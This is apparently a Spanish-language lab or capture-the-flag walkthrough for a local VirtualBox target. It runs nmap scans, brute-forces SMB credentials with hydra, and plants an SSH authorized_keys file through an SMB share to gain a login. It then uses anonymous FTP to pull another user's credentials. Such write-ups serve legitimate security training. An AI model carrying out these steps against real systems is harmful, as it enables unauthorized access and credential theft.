User.txt

Empezamos verificando que se ha creado una interfaz de red llamada vboxnet0:
    - ifconfig

Empezamos escaneado la red con nmap:
    - Descubrir cuantos hosts hay -> nmap 192.168.56.0/24 -sn -T5
    - Escaneado de todos los puertos -> nmap -p- -sS --min-rate 5000 --open -vvv IP -oN ports 
    - Escaneo en profundidad de los puertos abiertos -> nmap -p(lista de puestos) -sCV --min-rate 5000 IP (Ej: nmap -p22,80 -sCV --min-rate 5000 IP )
 
Vemos que el servicio smb esta abierto. Probamos hacer un ataque de fuerza bruta a este servicio:
    - Utilizar los siguientes diccionarios -> ./diccionarios/names.txt y ./diccionarios/passwords.txt 

    - hydra -L names.txt -P passwords.txt IP smb

Y encontramos una credencial valida. Intentamos conectarnos con rdesktop, pero no deja.

Probamos a usar smbmap para ver si hay algun recurso comapartido al que tengamos acceso.
Ver carpetas compartidas:
    - smbmap -H IP -u user -p pass
        Vemoc que hay una carpeta llamada folder a la que tenemos acceso de lectura, miramos dentro.
    - smbmap -H IP -u user -p pass -r folder

Parece que es el directorio de un usuario. Miramos si hay cosas interesantes pero no vemos nada.

Probamos a crear una clave publica y privada para conectarnos por ssh sin necesidad de contraseñas:
    - ssh-keygen
    - cat id_rsa.pub > authorized_keys
    - smbmap -H IP-u "user" -p "pass" --upload authorized_keys folder/.ssh/authorized_keys
    - ssh -i id_rsa user@IP

Una vez dentro, miramos si hay algo interesante para hacer una escalada de privilegios.
Miramos los puertos:
    - netstat -a 
y vemos que el puerto 21 esta abierto. En este puerto normalmente hay un servidor ftp. 
Conectarnos al servidor ftp:
    - ftp
    - open 127.0.0.1
nos pide usuario y contraseña, por lo que no podemos porque nos falta la contraseña del usuario.

Probamos a conectarnos con el usuario anonymous, el cual no hace falta usar contraseña:
    - ftp
    - open 127.0.0.1, en usuario ponemos anoymous y en la contraseña le damos a enter.

Una vez dentro:
    - dir o ls 
    - get file.txt para descargar el fichero.
    - quit 
type file.txt y vemos otra credencial de otro usuario. 

Nos conectamos con rdesktop.
